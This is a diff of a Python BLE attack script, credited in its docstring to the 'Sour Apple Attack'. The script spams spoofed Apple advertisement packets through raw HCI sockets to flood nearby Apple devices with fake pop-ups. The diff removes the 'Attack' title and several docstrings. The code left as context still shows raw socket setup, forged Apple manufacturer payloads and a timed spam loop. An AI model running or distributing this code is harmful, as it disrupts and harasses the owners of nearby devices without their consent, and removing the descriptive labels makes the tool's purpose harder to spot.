@@ -1,6 +1,4 @@
 """
-Apple Advertisement Spam BLE Attack
-
 This script broadcasts fake Apple device BLE advertisements (similar to AirTags, Apple TVs, etc.)
 to nearby Apple devices. Based on JammyTools sour.py (Sour Apple Attack).
 
@@ -34,7 +32,6 @@ APPLE_TYPES = [0x27, 0x09, 0x02, 0x1e, 0x2b, 0x2d, 0x2f, 0x01, 0x06, 0x20, 0xc0]
 
 
 def enable_hci_device(device_id):
-    """Enable and prepare HCI device for advertising."""
     try:
         raw_socket = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
         hci_data = struct.pack("H", device_id)
@@ -48,7 +45,6 @@ def enable_hci_device(device_id):
 
 
 def build_apple_adv(dev_id):
-    """Generate Apple advertisement packet."""
     typ = random.choice(APPLE_TYPES)
     payload = (16, 0xFF, 0x4C, 0x00, 0x0F, 0x05, 0xC1, typ,
                random.randint(0, 255), random.randint(0, 255), random.randint(0, 255),
@@ -57,7 +53,6 @@ def build_apple_adv(dev_id):
 
 
 def send_adv_on_device(sock, delay=1):
-    """Send Apple advertisement on specified socket."""
     pkt = build_apple_adv(sock)
     
     cfg = [20, 20, 3, 0, 0, 0, 0, 0, 0, 0, 0, 7, 0]
@@ -80,16 +75,7 @@ def send_adv_on_device(sock, delay=1):
     time.sleep(0.01)
 
 
-def ad_spam(device_ids, duration=60, interval=0.1):
-    """
-    Apple advertisement spam execution.
-    
-    Args:
-        device_ids (list): Target HCI devices
-        duration (int): Runtime in seconds
-        interval (float): Packet interval in seconds
-    """
-        
+def ad_spam(device_ids, duration=60, interval=0.1):        
     socks = []
     
     try:
